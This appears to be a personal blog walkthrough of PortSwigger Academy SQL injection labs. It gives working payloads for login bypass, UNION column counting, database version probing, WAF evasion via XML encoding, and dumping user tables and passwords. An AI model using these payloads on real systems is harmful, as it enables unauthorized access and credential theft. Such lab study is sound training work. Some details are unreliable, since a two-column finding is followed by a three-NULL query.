---
layout: post
title:  "Burp Suite Learning through PortSwigger Academy"
date:   15 Oct 2025
categories: Demo
tags: Cybersecurity
---
<html>
<body>
<div markdown="block" style="margin-top: 10px">
    
### Intro
Self-learning walkthrough on PortSwigger Academy labs

### 1. SQLi

- [PortSwigger SQLi CheatSheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

#### 1.1 Lab: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
- Check the request of switching product category, intercept it and send it to the Repeater to examine

- URLEncode **Accessories' OR 1=1--**, append **Accessories%27%20OR%201%3D1--** to the URL and is solved

#### 1.2 Lab: SQL injection vulnerability allowing login bypass
- According to the lab hint, there's a SQLi vulnerability on login function

- input **administrator** and **' OR 1=1--** as username and password to exploit

#### 1.3 Lab: SQL injection with filter bypass via XML encoding
- Intercepted the request and found:

```
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>2</productId><storeId>1</storeId></stockCheck>
```

- Notice the response returns like 899 units which indicates **SELECT COUNT()**

- Assuming that the backend logic seems like:

```
result = "SELECT COUNT(*) from stock where productId='" + req.productId + "' and storeId='" req.storeId + "'"
```

- Expected exploited query: 1 UNION SELECT username || '-' || password FROM users

- Use Hackvertor extension to encode XML parsing to bypass WAF (Highlight input > extensions > Hackvertor > Encode > hex_entities)

#### 1.4 Lab: SQL injection attack, querying the database type and version on Oracle
- Intercepted the request and checked the UNION SQLi

- The expected injected query is **SELECT BANNER FROM v$version**

- Check the columns returned by first query and found 2 columns

- Use **' UNION SELECT BANNER,NULL FROM v$version--**

#### 1.5 Lab: SQL injection UNION attack, determining the number of columns returned by the query
- Intercepted the request and checked the UNION SQLi

- First use **' UNION SELECT NULL--** to check if the first query returns one column. Continue adding ,NULL after it until the response doesn't show internal server error

- Finally it got 2 columns, so the final query should be **'+UNION+SELECT+NULL,NULL,NULL--**

#### 1.6 Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft
- Try **'+UNION+SELECT+NULL--+** and continously adding ,NULL after it, Found there're two columns

- Notice that it's MySQL, use **SELECT @@version**

- The final URL should be like **category='+UNION+SELECT+%40%40version,NULL--+**

#### 1.7 Lab: SQL injection attack, listing the database contents on non-Oracle databases
- I need to get the name of the table as users, probably using **SELECT * FROM information_schema.tables**

- But first, identify the columns returned by the first query. Found 2 columns by **'+UNION+SELECT+NULL,NULL--**

- Use **'+UNION+SELECT+TABLE_NAME,NULL+FROM+information_schema.tables--** to check if there're some tables related to users. Found **users_hcbxzc**

- Furthermore, use **'+UNION+SELECT+COLUMN_NAME,NULL+FROM+information_schema.columns+WHERE+TABLE_NAME%3d'users_hcbxzc'--** to dump all columns in table **users_hcbxzc**. Found **password_hhvvqu**, **email**, **username_pyxxpn**

- Finally, use **'+UNION+SELECT+username_pyxxpn,password_hhvvqu+FROM+users_hcbxzc--** to dump all user records in table **users_hcbxzc**

#### 1.8 Lab: SQL injection attack, listing the database contents on Oracle
- Notice it's Oracle database. In order of that, I have to include FROM table inside my query instead of SELECT NULL

- Use **'+UNION+SELECT+NULL,NULL+FROM+dual--** and found that 2 columns are valid

- Use **'+UNION+SELECT+TABLE_NAME,NULL+FROM+all_tables--** and Found there's a table **USERS_NVDWQS** is suspicious related to user 

- Use **'+UNION+SELECT+COLUMN_NAME,NULL+FROM+all_tab_columns+WHERE+TABLE_NAME%3d'USERS_NVDWQS'--** to dump all column names in table **USERS_NVDWQS**. Found 3 columns: PASSWORD_VUZJRD, EMAIL, USERNAME_QUPLHR

- Use **'+UNION+SELECT+USERNAME_QUPLHR,PASSWORD_VUZJRD+FROM+USERS_NVDWQS--** to dump all user records and found administrator's username and password




## Materials


</div>
</body>
</html>
